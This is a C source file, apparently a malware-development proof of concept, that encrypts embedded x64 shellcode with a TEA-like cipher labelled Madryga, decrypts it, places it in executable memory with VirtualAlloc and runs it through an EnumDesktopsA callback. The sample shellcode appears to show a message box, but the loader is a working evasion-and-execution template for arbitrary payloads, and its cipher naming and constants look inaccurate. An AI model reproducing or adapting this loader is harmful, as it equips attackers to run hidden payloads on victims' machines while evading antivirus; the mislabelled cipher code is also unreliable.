#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define ROUNDS 16

typedef uint32_t u32;

u32 key[4] = {0x67686f73, 0x74776f6c, 0x666c6162, 0x776f6c66};

void madryga_encrypt(u32 *v, u32 *k) {
  u32 v0 = v[0], v1 = v[1], sum = 0, i;
  u32 delta = 0x9E3779B9;
  for (i = 0; i < ROUNDS; i++) {
    sum += delta;
    v0 += ((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]);
    v1 += ((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]);
  }
  v[0] = v0; v[1] = v1;
}

void madryga_decrypt(u32 *v, u32 *k) {
  u32 v0 = v[0], v1 = v[1], sum = 0xE3779B90, i;
  u32 delta = 0x9E3779B9;
  for (i = 0; i < ROUNDS; i++) {
    v1 -= ((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]);
    v0 -= ((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]);
    sum -= delta;
  }
  v[0] = v0; v[1] = v1;
}

void madryga_encrypt_shellcode(unsigned char* shellcode, int shellcode_len) {
  int i;
  uint32_t *ptr = (uint32_t*) shellcode;
  for (i = 0; i < shellcode_len/8; i++) {
    madryga_encrypt(ptr, key);
    ptr += 2;
  }
  int remaining = shellcode_len % 8;
  if (remaining != 0) {
    unsigned char pad[8] = {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
    memcpy(pad, ptr, remaining);
    madryga_encrypt((uint32_t*) pad, key);
    memcpy(ptr, pad, remaining);
  }
}

void madryga_decrypt_shellcode(unsigned char* shellcode, int shellcode_len) {
  int i;
  uint32_t *ptr = (uint32_t*) shellcode;
  for (i = 0; i < shellcode_len/8; i++) {
    madryga_decrypt(ptr, key);
    ptr += 2;
  }
  int remaining = shellcode_len % 8;
  if (remaining != 0) {
    unsigned char pad[8] = {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
    memcpy(pad, ptr, remaining);
    madryga_decrypt((uint32_t*) pad, key);
    memcpy(ptr, pad, remaining);
  }
}

int main() {
  unsigned char shellcode[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
"\x8d\x8d\x2e\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
"\x00\x3e\x4c\x8d\x85\x1f\x01\x00\x00\x48\x31\xc9\x41\xba"
"\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
"\x56\xff\xd5\x48\x69\x2c\x49\x20\x61\x6d\x20\x53\x6e\x6f"
"\x77\x77\x6f\x6c\x66\x00\x47\x68\x6f\x73\x74\x20\x57\x6f"
"\x6c\x66\x20\x4c\x61\x62\x00\x75\x73\x65\x72\x33\x32\x2e"
"\x64\x6c\x6c\x00";

  int shellcode_len = sizeof(shellcode);
  int pad_len = shellcode_len + (8 - shellcode_len % 8) % 8;
  unsigned char padded[pad_len];
  memset(padded, 0x90, pad_len);
  memcpy(padded, shellcode, shellcode_len);
  for (int i = 0; i < pad_len / 8; i++) {
    madryga_encrypt_shellcode(padded + i * 8, 8);
  }
  for (int i = 0; i < pad_len / 8; i++) {
    madryga_decrypt_shellcode(padded + i * 8, 8);
  }
  LPVOID mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, padded, shellcode_len);
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
  return 0;
}
